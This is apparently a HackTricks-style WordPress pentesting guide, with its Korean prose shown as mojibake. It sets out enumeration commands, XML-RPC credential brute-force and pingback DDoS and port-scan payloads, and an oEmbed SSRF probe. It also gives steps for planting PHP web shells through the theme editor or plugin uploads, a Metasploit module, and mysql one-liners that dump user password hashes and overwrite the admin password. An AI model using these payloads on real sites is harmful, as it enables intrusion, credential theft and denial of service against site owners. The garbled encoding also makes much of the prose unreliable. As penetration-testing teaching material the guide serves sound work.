# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## ê¸°ë³¸ ì •ë³´

- **Uploaded** íŒŒì¼ì€ ë‹¤ìŒ ìœ„ì¹˜ë¡œ ì—…ë¡œë“œë©ë‹ˆë‹¤: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** ë”°ë¼ì„œ í…Œë§ˆì˜ ì¼ë¶€ phpë¥¼ ë³€ê²½í•˜ì—¬ RCEë¥¼ ì–»ìœ¼ë ¤ëŠ” ê²½ìš° í•´ë‹¹ ê²½ë¡œë¥¼ ì‚¬ìš©í•˜ê²Œ ë©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´: **theme twentytwelve**ë¥¼ ì‚¬ìš©í•˜ë©´ [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)ì—ì„œ **404.php** íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` íŒŒì¼ì—ì„œ ë°ì´í„°ë² ì´ìŠ¤ì˜ ë£¨íŠ¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- í™•ì¸í•´ì•¼ í•  ê¸°ë³¸ ë¡œê·¸ì¸ ê²½ë¡œ: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt`ì—ëŠ” ì„¤ì¹˜ëœ WordPress ë²„ì „ ë“± ìœ ìš©í•œ ì •ë³´ê°€ ë“¤ì–´ìˆìŠµë‹ˆë‹¤.
- `wp-activate.php`ëŠ” ìƒˆë¡œìš´ WordPress ì‚¬ì´íŠ¸ë¥¼ ì„¤ì •í•  ë•Œ ì´ë©”ì¼ í™œì„±í™” ê³¼ì •ì— ì‚¬ìš©ë©ë‹ˆë‹¤.
- ë¡œê·¸ì¸ í´ë”ë“¤(ìˆ¨ê¸°ê¸° ìœ„í•´ ì´ë¦„ì´ ë³€ê²½ë˜ì—ˆì„ ìˆ˜ ìˆìŒ):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php`ëŠ” HTTPë¥¼ ì „ì†¡ ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ, XMLì„ ì¸ì½”ë”© ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë¥¼ ì „ì†¡í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” WordPressì˜ ê¸°ëŠ¥ì„ ë‚˜íƒ€ë‚´ëŠ” íŒŒì¼ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ìœ í˜•ì˜ í†µì‹ ì€ WordPress [REST API](https://developer.wordpress.org/rest-api/reference)ë¡œ ëŒ€ì²´ë˜ì—ˆìŠµë‹ˆë‹¤.
- `wp-content` í´ë”ëŠ” í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆê°€ ì €ì¥ë˜ëŠ” ì£¼ìš” ë””ë ‰í† ë¦¬ì…ë‹ˆë‹¤.
- `wp-content/uploads/`ëŠ” í”Œë«í¼ì— ì—…ë¡œë“œëœ ëª¨ë“  íŒŒì¼ì´ ì €ì¥ë˜ëŠ” ë””ë ‰í† ë¦¬ì…ë‹ˆë‹¤.
- `wp-includes/`ëŠ” ì¸ì¦ì„œ, ê¸€ê¼´, JavaScript íŒŒì¼, ìœ„ì ¯ ë“± í•µì‹¬ íŒŒì¼ë“¤ì´ ì €ì¥ë˜ëŠ” ë””ë ‰í† ë¦¬ì…ë‹ˆë‹¤.
- `wp-sitemap.xml` WordPress ë²„ì „ 5.5 ì´ìƒì—ì„œëŠ” ê³µê°œ ê²Œì‹œë¬¼ê³¼ ê³µê°œì ìœ¼ë¡œ ì¿¼ë¦¬ ê°€ëŠ¥í•œ í¬ìŠ¤íŠ¸ íƒ€ì… ë° ë¶„ë¥˜ë²•ì„ ëª¨ë‘ í¬í•¨í•˜ëŠ” sitemap XML íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤.

**Post exploitation**

- `wp-config.php` íŒŒì¼ì—ëŠ” WordPressê°€ ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•˜ëŠ” ë° í•„ìš”í•œ ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„, ë°ì´í„°ë² ì´ìŠ¤ í˜¸ìŠ¤íŠ¸, ì‚¬ìš©ì ì´ë¦„ ë° ë¹„ë°€ë²ˆí˜¸, ì¸ì¦ í‚¤ ë° ì†”íŠ¸, ë°ì´í„°ë² ì´ìŠ¤ í…Œì´ë¸” ì ‘ë‘ì‚¬ ë“±ì˜ ì •ë³´ê°€ ë“¤ì–´ ìˆìŠµë‹ˆë‹¤. ì´ êµ¬ì„± íŒŒì¼ì€ ë˜í•œ ë¬¸ì œ í•´ê²°ì— ìœ ìš©í•  ìˆ˜ ìˆëŠ” DEBUG ëª¨ë“œë¥¼ í™œì„±í™”í•˜ëŠ” ë°ì—ë„ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì‚¬ìš©ì ê¶Œí•œ

- **Administrator**
- **Editor**: ìì‹ ì˜ ê¸€ê³¼ ë‹¤ë¥¸ ì‚¬ëŒì˜ ê¸€ì„ ë°œí–‰í•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤.
- **Author**: ìì‹ ì˜ ê¸€ì„ ë°œí–‰í•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤.
- **Contributor**: ê¸€ì„ ì‘ì„±í•˜ê³  ê´€ë¦¬í•  ìˆ˜ ìˆìœ¼ë‚˜ ë°œí–‰í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.
- **Subscriber**: ê²Œì‹œë¬¼ì„ íƒìƒ‰í•˜ê³  ìì‹ ì˜ í”„ë¡œí•„ì„ í¸ì§‘í•©ë‹ˆë‹¤.

## **Passive Enumeration**

### **WordPress ë²„ì „ í™•ì¸**

íŒŒì¼ `/license.txt` ë˜ëŠ” `/readme.html`ì„ ì°¾ì„ ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.

í˜ì´ì§€ì˜ **ì†ŒìŠ¤ ì½”ë“œ** ë‚´ì—ì„œ (ì˜ˆ: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS ë§í¬ íŒŒì¼

![](<../../images/image (533).png>)

- JavaScript íŒŒì¼

![](<../../images/image (524).png>)

### í”ŒëŸ¬ê·¸ì¸ ê°€ì ¸ì˜¤ê¸°
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### í…Œë§ˆ ê°€ì ¸ì˜¤ê¸°
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ì¼ë°˜ì ì¸ ë²„ì „ ì¶”ì¶œ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ëŠ¥ë™ì  ì—´ê±°

### í”ŒëŸ¬ê·¸ì¸ ë° í…Œë§ˆ

ì•„ë§ˆ ëª¨ë“  í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆë¥¼ ì°¾ì„ ìˆ˜ëŠ” ì—†ì„ ê²ƒì…ë‹ˆë‹¤. ëª¨ë‘ë¥¼ ë°œê²¬í•˜ë ¤ë©´ **actively Brute Force a list of Plugins and Themes** í•´ì•¼ í•©ë‹ˆë‹¤(ë‹¤í–‰íˆ ì´ëŸ¬í•œ ëª©ë¡ì„ í¬í•¨í•œ ìë™í™” ë„êµ¬ë“¤ì´ ìˆìŠµë‹ˆë‹¤).

### ì‚¬ìš©ì

- **ID Brute:** WordPress ì‚¬ì´íŠ¸ì—ì„œ ì‚¬ìš©ì IDë¥¼ Brute Forcingí•˜ì—¬ ìœ íš¨í•œ ì‚¬ìš©ìë¥¼ ì–»ìŠµë‹ˆë‹¤:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
ì‘ë‹µì´ **200** ë˜ëŠ” **30X**ì´ë©´ í•´ë‹¹ idëŠ” **ìœ íš¨**í•©ë‹ˆë‹¤. ì‘ë‹µì´ **400**ì´ë©´ í•´ë‹¹ idëŠ” **ë¬´íš¨**ì…ë‹ˆë‹¤.

- **wp-json:** ì‚¬ìš©ì ì •ë³´ë¥¼ ì¿¼ë¦¬í•˜ì—¬ ì–»ì–´ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ì‚¬ìš©ìì— ëŒ€í•œ ì¼ë¶€ ì •ë³´ë¥¼ ë…¸ì¶œí•  ìˆ˜ ìˆëŠ” ë˜ ë‹¤ë¥¸ `/wp-json/` endpointëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **ì´ ê¸°ëŠ¥ì„ í™œì„±í™”í•œ ì‚¬ìš©ìì— ëŒ€í•œ ì •ë³´ë§Œ ì œê³µë©ë‹ˆë‹¤**.

ë˜í•œ **/wp-json/wp/v2/pages**ê°€ IP ì£¼ì†Œë¥¼ leakí•  ìˆ˜ ìˆë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”.

- **Login username enumeration**: ë¡œê·¸ì¸ ì‹œ **`/wp-login.php`**ì˜ **ë©”ì‹œì§€**ê°€ **ë‹¤ë¥´ê²Œ í‘œì‹œë˜ì–´** **ì‚¬ìš©ì ì´ë¦„ì˜ ì¡´ì¬ ì—¬ë¶€**ë¥¼ ì•Œë ¤ì¤ë‹ˆë‹¤.

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (ì˜ˆ: ì´ ê³¼ì •ì„ ìë™í™”í•˜ë ¤ë©´[ using this](https://github.com/relarizky/wpxploit)ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**í™•ì¸**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ë˜ëŠ” **`metaWeblog.getUsersBlogs`** ì€(ëŠ”) brute-force credentialsì— ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë©”ì„œë“œë“¤ì…ë‹ˆë‹¤. ì´ë“¤ ì¤‘ í•˜ë‚˜ë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
200 ì½”ë“œ ì‘ë‹µ ì•ˆì— _"Incorrect username or password"_ ë©”ì‹œì§€ê°€ ë‚˜íƒ€ë‚˜ì•¼ í•˜ë©°, ìê²© ì¦ëª…ì´ ìœ íš¨í•˜ì§€ ì•Šì„ ê²½ìš° í‘œì‹œë©ë‹ˆë‹¤.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

ì˜¬ë°”ë¥¸ ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ë©´ íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‘ë‹µì—ëŠ” ê²½ë¡œê°€ í‘œì‹œë©ë‹ˆë‹¤ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
ë˜í•œ **ë” ë¹ ë¥¸ ë°©ë²•**ì´ ìˆëŠ”ë°, ë™ì¼í•œ ìš”ì²­ì—ì„œ ì—¬ëŸ¬ ìê²© ì¦ëª…ì„ ì‹œë„í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ **`system.multicall`**ì„ ì‚¬ìš©í•´ ìê²© ì¦ëª…ì„ ë¸Œë£¨íŠ¸í¬ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

ì´ ë°©ë²•ì€ ì‚¬ëŒìš©ì´ ì•„ë‹ˆë¼ í”„ë¡œê·¸ë¨ìš©ì´ë©° ì˜¤ë˜ëœ ë°©ì‹ì´ë¼ 2FAë¥¼ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ìœ íš¨í•œ ìê²© ì¦ëª…ì´ ìˆì§€ë§Œ ë©”ì¸ ë¡œê·¸ì¸ì— 2FAê°€ ì„¤ì •ë˜ì–´ ìˆë‹¤ë©´, **xmlrpc.phpë¥¼ ì•…ìš©í•˜ì—¬ í•´ë‹¹ ìê²© ì¦ëª…ìœ¼ë¡œ 2FAë¥¼ ìš°íšŒí•´ ë¡œê·¸ì¸í•  ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤**. ì½˜ì†”ì„ í†µí•´ í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ë™ì‘ì„ ìˆ˜í–‰í•  ìˆ˜ëŠ” ì—†ì§€ë§Œ, Ippsecê°€ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)ì—ì„œ ì„¤ëª…í•˜ëŠ” ê²ƒì²˜ëŸ¼ ì—¬ì „íˆ RCEì— ë„ë‹¬í•  ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

**DDoS or port scanning**

ëª©ë¡ì—ì„œ _**pingback.ping**_ ë©”ì„œë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤ë©´ Wordpressê°€ ì„ì˜ì˜ í˜¸ìŠ¤íŠ¸/í¬íŠ¸ë¡œ ìš”ì²­ì„ ë³´ë‚´ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ë¥¼ ì´ìš©í•´ **ìˆ˜ì²œ**ê°œì˜ Wordpress **ì‚¬ì´íŠ¸ë“¤**ì— í•œ **ëŒ€ìƒ**ì— ì ‘ì†í•˜ë„ë¡ ìš”ì²­í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ê·¸ ëŒ€ìƒì— **DDoS**ê°€ ë°œìƒí•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆìœ¼ë©°, ë˜ëŠ” ì´ë¥¼ ì‚¬ìš©í•´ **Wordpress**ë¡œ ë‚´ë¶€ **ë„¤íŠ¸ì›Œí¬**ë¥¼ **ìŠ¤ìº”**í•˜ê²Œ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤(ì„ì˜ì˜ í¬íŠ¸ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

**faultCode**ì˜ ê°’ì´ **0** (17)ë³´ë‹¤ **í°** ê²½ìš°, í¬íŠ¸ê°€ ì—´ë ¤ ìˆë‹¤ëŠ” ì˜ë¯¸ì…ë‹ˆë‹¤.

ì´ì „ ì„¹ì…˜ì—ì„œ **`system.multicall`**ì˜ ì‚¬ìš©ì„ ì‚´í´ë³´ë©´ ì´ ë©”ì„œë“œë¥¼ ì•…ìš©í•˜ì—¬ DDoSë¥¼ ìœ ë°œí•˜ëŠ” ë°©ë²•ì„ ë°°ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

ì´ íŒŒì¼ì€ ì¼ë°˜ì ìœ¼ë¡œ Wordpress ì‚¬ì´íŠ¸ì˜ ë£¨íŠ¸ì— ì¡´ì¬í•©ë‹ˆë‹¤: **`/wp-cron.php`**\
ì´ íŒŒì¼ì´ **ì ‘ê·¼ë  ë•Œ** **ë¬´ê±°ìš´** MySQL **ì¿¼ë¦¬**ê°€ ì‹¤í–‰ë˜ë¯€ë¡œ, **ê³µê²©ì**ê°€ **DoS**ë¥¼ **ìœ ë°œ**í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ, ê¸°ë³¸ì ìœ¼ë¡œ, `wp-cron.php`ëŠ” ëª¨ë“  í˜ì´ì§€ ë¡œë“œ ì‹œ(í´ë¼ì´ì–¸íŠ¸ê°€ ì–´ë–¤ Wordpress í˜ì´ì§€ë¥¼ ìš”ì²­í•  ë•Œë§ˆë‹¤) í˜¸ì¶œë˜ë©°, íŠ¸ë˜í”½ì´ ë§ì€ ì‚¬ì´íŠ¸ì—ì„œëŠ” ë¬¸ì œê°€ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (DoS).

Wp-Cronì„ ë¹„í™œì„±í™”í•˜ê³  í˜¸ìŠ¤íŠ¸ ë‚´ì—ì„œ ì‹¤ì œ cronjobì„ ìƒì„±í•´ ì •ê¸°ì ìœ¼ë¡œ í•„ìš”í•œ ì‘ì—…ì„ ìˆ˜í–‰í•˜ë„ë¡ í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤ (ë¬¸ì œ ì—†ì´).

### /wp-json/oembed/1.0/proxy - SSRF

ë‹¤ìŒ URLì— ì ‘ê·¼í•´ ë³´ì„¸ìš”: _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ ê·¸ë¦¬ê³  Worpress ì‚¬ì´íŠ¸ê°€ ë‹¹ì‹ ì—ê²Œ ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

ì´ ë„êµ¬ëŠ” **methodName: pingback.ping**ê³¼ ê²½ë¡œ **/wp-json/oembed/1.0/proxy**ê°€ ìˆëŠ”ì§€ í™•ì¸í•˜ê³ , ì¡´ì¬í•˜ë©´ ì´ë¥¼ ì•…ìš©í•˜ë ¤ ì‹œë„í•©ë‹ˆë‹¤.

## ìë™ ë„êµ¬
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## ë¹„íŠ¸ í•˜ë‚˜ ë®ì–´ì¨ì„œ ì ‘ê·¼í•˜ê¸°

ì‹¤ì œ ê³µê²©ì´ë¼ê¸°ë³´ë‹¤ëŠ” í˜¸ê¸°ì‹¬ì— ê°€ê¹ë‹¤. í•´ë‹¹ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)ì—ì„œëŠ” ì–´ë–¤ wordpress íŒŒì¼ì—ì„œë“  1ë¹„íŠ¸ë¥¼ ë’¤ì§‘ì„ ìˆ˜ ìˆì—ˆë‹¤. ë”°ë¼ì„œ íŒŒì¼ `/var/www/html/wp-includes/user.php`ì˜ ìœ„ì¹˜ `5389`ì˜ ë¹„íŠ¸ë¥¼ ë’¤ì§‘ì–´ NOT (`!`) ì—°ì‚°ì„ NOPë¡œ ë§Œë“¤ ìˆ˜ ìˆì—ˆë‹¤.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**ì‚¬ìš© ì¤‘ì¸ í…Œë§ˆì˜ php ìˆ˜ì • (admin credentials needed)**

Appearance â†’ Theme Editor â†’ 404 Template (ì˜¤ë¥¸ìª½)

php shellìš©ìœ¼ë¡œ ë‚´ìš©ì„ ë³€ê²½:

![](<../../images/image (384).png>)

ì—…ë°ì´íŠ¸ëœ í˜ì´ì§€ì— ì–´ë–»ê²Œ ì ‘ê·¼í•˜ëŠ”ì§€ ì¸í„°ë„·ì—ì„œ ê²€ìƒ‰í•˜ì„¸ìš”. ì´ ê²½ìš° ë‹¤ìŒ ìœ„ì¹˜ì— ì ‘ê·¼í•´ì•¼ í•©ë‹ˆë‹¤: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
ì„¸ì…˜ì„ ì–»ê¸° ìœ„í•´.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Create your php backdoor using for example:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

ì´ ë°©ë²•ì€ ì·¨ì•½í•œ ê²ƒìœ¼ë¡œ ì•Œë ¤ì§„ ì•…ì„± pluginì„ ì„¤ì¹˜í•˜ì—¬ web shellì„ íšë“í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤. ì´ ê³¼ì •ì€ WordPress dashboardë¥¼ í†µí•´ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤:

1. **Plugin Acquisition**: í”ŒëŸ¬ê·¸ì¸ì€ Exploit DBì™€ ê°™ì€ ì¶œì²˜ì—ì„œ [**here**](https://www.exploit-db.com/exploits/36374)ì²˜ëŸ¼ ì–»ìŠµë‹ˆë‹¤.
2. **Plugin Installation**:
- WordPress dashboardì—ì„œ `Dashboard > Plugins > Upload Plugin`ìœ¼ë¡œ ì´ë™í•©ë‹ˆë‹¤.
- ë‹¤ìš´ë¡œë“œí•œ pluginì˜ zip fileì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤.
3. **Plugin Activation**: pluginì´ ì„±ê³µì ìœ¼ë¡œ ì„¤ì¹˜ë˜ë©´ dashboardì—ì„œ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤.
4. **Exploitation**:
- "reflex-gallery" pluginì´ ì„¤ì¹˜ë˜ê³  í™œì„±í™”ë˜ë©´, í•´ë‹¹ pluginì€ ì·¨ì•½í•œ ê²ƒìœ¼ë¡œ ì•Œë ¤ì ¸ ìˆì–´ ì´ë¥¼ ì´ìš©í•´ ê³µê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- Metasploit frameworkëŠ” ì´ ì·¨ì•½ì ì— ëŒ€í•œ exploitë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì ì ˆí•œ ëª¨ë“ˆì„ ë¡œë“œí•˜ê³  íŠ¹ì • ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ meterpreter sessionì„ íšë“í•˜ì—¬ ì‚¬ì´íŠ¸ì— ë¬´ë‹¨ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ì´ëŠ” WordPress ì‚¬ì´íŠ¸ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ì—¬ëŸ¬ ë°©ë²• ì¤‘ í•˜ë‚˜ì— ë¶ˆê³¼í•©ë‹ˆë‹¤.

í•´ë‹¹ ë‚´ìš©ì—ëŠ” pluginì„ ì„¤ì¹˜í•˜ê³  í™œì„±í™”í•˜ëŠ” WordPress dashboard ë‹¨ê³„ë“¤ì„ ë³´ì—¬ì£¼ëŠ” ì‹œê°ì  ìë£Œê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ ë°©ì‹ìœ¼ë¡œ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ê²ƒì€ ì ì ˆí•œ ìŠ¹ì¸ ì—†ì´ ë¶ˆë²•ì ì´ë©° ë¹„ìœ¤ë¦¬ì ì„ì„ ìœ ì˜í•´ì•¼ í•©ë‹ˆë‹¤. ì´ ì •ë³´ëŠ” ì±…ì„ê° ìˆê²Œ, ëª…ì‹œì  í—ˆê°€ê°€ ìˆëŠ” ë²•ì  ë§¥ë½(ì˜ˆ: penetration testing)ì—ì„œë§Œ ì‚¬ìš©ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ WordPressì— ì‚¬ìš©ìë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ ì»¤ìŠ¤í…€ plugin(backdoor)ì„ WordPressì— ì—…ë¡œë“œí•©ë‹ˆë‹¤.
- _**(RCE) Built-In Plugin Edit:**_ WordPressì˜ ë‚´ì¥ í”ŒëŸ¬ê·¸ì¸ì„ í¸ì§‘í•©ë‹ˆë‹¤.
- _**(RCE) Built-In Theme Edit:**_ WordPressì˜ ë‚´ì¥ í…Œë§ˆë¥¼ í¸ì§‘í•©ë‹ˆë‹¤.
- _**(Custom) Custom Exploits:**_ ì„œë“œíŒŒí‹° WordPress Plugins/Themesìš© ì»¤ìŠ¤í…€ Exploitsë¥¼ ì œê³µí•©ë‹ˆë‹¤.

## Post Exploitation

Extract usernames and passwords:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ê´€ë¦¬ì ë¹„ë°€ë²ˆí˜¸ ë³€ê²½:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress í”ŒëŸ¬ê·¸ì¸ Pentest

### Attack Surface

Wordpress í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ì–´ë–»ê²Œ ë…¸ì¶œí•˜ëŠ”ì§€ ì•„ëŠ” ê²ƒì€ í•´ë‹¹ ê¸°ëŠ¥ì—ì„œ ì·¨ì•½ì ì„ ì°¾ëŠ” ë° í•µì‹¬ì…ë‹ˆë‹¤. í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ë…¸ì¶œí•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒ ê¸€ë¨¸ë¦¬í‘œì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°, ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ì˜ ì˜ˆì‹œëŠ” [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/)ì— ìˆìŠµë‹ˆë‹¤.

